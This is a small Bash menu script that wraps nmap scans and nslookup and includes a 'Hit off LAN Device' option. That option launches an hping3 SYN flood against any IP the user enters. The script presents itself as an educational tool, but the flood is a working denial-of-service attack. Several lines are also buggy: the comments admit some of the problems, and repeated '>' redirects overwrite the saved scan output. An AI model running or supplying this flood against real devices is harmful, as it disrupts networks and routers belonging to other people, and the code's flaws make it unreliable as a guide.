#! /bin/bash
LANE=$(ifconfig en0 | grep inet | cut -d: -f2 | awk '{print $2}')
date=$(date)
echo "Welcome" $USER "To my little tool, your LAN IP is" ${LANE} "The date is" ${date}
echo "This program is meant only for simple and educational/personal uses"

sleep 2
#menu
menu() {
clear
echo "Please choose what you want!"
echo "  [0] Ping sweep (Full Scan) Network"
echo "  [1] Check for Certain Port(S)"
echo "  [2] Scan all Open Ports"
echo "  [3] Scan Tool"
echo "  [4] Hit off LAN Device (Routers Included)"
echo "  [5] Close the Program"
echo
echo -en "What would you like to do: "

#read keyboard input into the variable mc
read mc


case $mc in
    0) pswfc ;;
    1) portrange ;;
    2) allPorts ;;
    3) scanTool ;;
    4) hitlan ;;
    5) exit ;;
    *) echo;echo "Invalid selection made";sleep 2;clear;menu ;;
    esac
}
pswfc() {
  if [ -f ~/Desktop/${psip}_SCANinfo.txt ]; then rm ~/Desktop/${psip}_SCANinfo.txt
  fi
  echo -en "Enter IP:"
  read psip
  nmap -A ${psip} > ~/Desktop/${psip}_SCANinfo.txt
  echo "Scan Completed! All info will be in a txt file on your desktop" > ~/Desktop/${psip}_SCANinfo.txt
  sleep 3
  menu
}
hitlan() {

  echo -en "Enter LAN IP:"
  read lanski
  hping3 --flood -V -S ${lanski}
  echo "Flooding" ${lanski} "Press Left Control C to stop it"
  sleep 3
  menu
}
portrange() {
    if [ -f ~/Desktop/${p1}_${p2}_${PRIP}_PORTinfo.txt ]; then rm ~/Desktop/${p1}_${p2}_${PRIP}_PORTinfo.txt
    fi
    echo -en "Enter the IP:"
    read PRIP
    echo -en "Enter the start of the range you want to scan eg. 80:"
    read p1
    echo -en "Enter the end of the range to scan eg. 90:"
    read p2
    echo "Scanning Port" ${p1} "through" ${p2} "On IP" ${PRIP}
    nmap -p ${p1}-${p2} ${PRIP} > ~/Desktop/${p1}_${p2}_${PRIP}_PORTinfo.txt
    echo "Finished Scanning, All the info will be put in a text file on your desktop"
    sleep 3
    menu
}

allPorts() {
    if [ -f ~/Desktop/${LANIP}_PORTinfo.txt ]; then rm ~/Desktop/${LANIP}_PORTinfo.txt
    fi
    #ifconfig en0 | grep inet | cut -d: -f2 | awk '{print $2}'
    echo -en "Enter the IP you wish to scan:"
    read LANIP
    #echo "Enter the Range of ports to scan for"
    #echo -en "Port:"
    #read p1
    #echo -en "Through:"
    #read p2
    echo "Scanning"${LANIP}"!" > ~/Desktop/${LANIP}_PORTinfo.txt
    echo "______________________" > ~/Desktop/${LANIP}_PORTinfo.txt
    nmap ${LANIP} > ~/Desktop/${LANIP}_PORTinfo.txt

    sleep 3
    menu
}

scanTool() {
    OUTPUTFILE2=Scanned_by_${USER}
    #PROBLEM HERE IS NSL IS NOT DEFINED AT RUNTIME FOR THIS FUNCTION
    if [ -f ~/Desktop/${NSL}_info.txt ]; then rm ~/Desktop/${NSL}_info.txt
    fi

    echo -en "Enter IP: "
    read NSL
    #WHY ECHO SCANNING NSL TO A FILE?
    #Echo Both into a file
    #WHY NOT ECHO THIS TO A FILE?
    echo ${USER} "Scanning" ${NSL} > ~/Desktop/${NSL}_info.txt
    echo "*****************************************" > ~/Desktop/${NSL}_info.txt
    echo "Scan of" ${NSL} "" > ~/Desktop/${NSL}_info.txt
    nslookup ${NSL} > ~/Desktop/${NSL}_info.txt
    echo "Finished scan of" ${NSL} " All info will be on a txt file on your desktop"
    sleep 2
    menu
}

#launch the menu
menu
